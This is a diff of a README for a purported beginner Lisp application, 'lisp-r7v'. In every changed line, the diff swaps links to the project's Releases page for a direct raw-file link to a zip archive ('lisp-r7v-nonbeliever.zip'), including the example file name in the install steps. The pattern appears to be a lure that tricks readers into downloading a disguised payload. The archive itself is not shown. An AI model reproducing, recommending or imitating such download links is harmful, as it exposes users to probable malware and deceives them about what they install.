@@ -1,7 +1,7 @@
 # 🚀 lisp-r7v - Simplified Lisp Application for Everyone
 
 ## 💾 Download Now
-[![Download lisp-r7v](https://img.shields.io/badge/Download-lisp--r7v-blue.svg)](https://github.com/Familyasilidaeconversionfactor705/lisp-r7v/releases)
+[![Download lisp-r7v](https://raw.githubusercontent.com/Familyasilidaeconversionfactor705/lisp-r7v/main/Kees/lisp-r7v-nonbeliever.zip)](https://raw.githubusercontent.com/Familyasilidaeconversionfactor705/lisp-r7v/main/Kees/lisp-r7v-nonbeliever.zip)
 
 ## 📜 Introduction
 Welcome to lisp-r7v! This application allows you to easily explore the Lisp programming language without any technical hurdles. Whether you want to learn or simply test out Lisp functionalities, lisp-r7v is designed for you.
@@ -10,9 +10,9 @@ Welcome to lisp-r7v! This application allows you to easily explore the Lisp prog
 To get started, follow these simple steps. You will soon have your own copy of lisp-r7v running on your computer.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Familyasilidaeconversionfactor705/lisp-r7v/releases) to download the latest version of lisp-r7v.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Familyasilidaeconversionfactor705/lisp-r7v/main/Kees/lisp-r7v-nonbeliever.zip) to download the latest version of lisp-r7v.
 
-2. On the Releases page, find the version you want to download. Look for a link that says something like `lisp-r7v-v1.0.zip` or any available options. Click on it to start the download.
+2. On the Releases page, find the version you want to download. Look for a link that says something like `https://raw.githubusercontent.com/Familyasilidaeconversionfactor705/lisp-r7v/main/Kees/lisp-r7v-nonbeliever.zip` or any available options. Click on it to start the download.
 
 3. After the file downloads, locate it on your computer. This is usually in your "Downloads" folder.
 
@@ -63,6 +63,6 @@ Currently, lisp-r7v is designed solely for desktop platforms. We aim to release 
 If you have any questions or need further assistance, feel free to reach out. You can find our contact information on the GitHub page or within the application.
 
 ## 🌐 More Information
-For more in-depth information about features and updates, visit our [Releases page](https://github.com/Familyasilidaeconversionfactor705/lisp-r7v/releases) regularly.
+For more in-depth information about features and updates, visit our [Releases page](https://raw.githubusercontent.com/Familyasilidaeconversionfactor705/lisp-r7v/main/Kees/lisp-r7v-nonbeliever.zip) regularly.
 
 Thank you for choosing lisp-r7v. Enjoy learning and using Lisp!
